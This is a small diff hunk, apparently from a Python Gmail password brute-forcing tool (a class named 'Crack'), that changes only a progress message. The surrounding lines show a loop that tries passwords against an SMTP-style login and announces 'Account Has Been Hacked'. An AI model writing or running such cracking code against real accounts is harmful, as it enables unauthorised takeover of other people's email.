@@ -61,7 +61,7 @@ class Crack():
             i += 1
             while True:
                 try:
-                    print("Attempt: " + str(i))
+                    print("Attempt " + str(i))
                     self.server.login(self.gmail, password)
                     print("Account Has Been Hacked, Password : " + password)
                     break
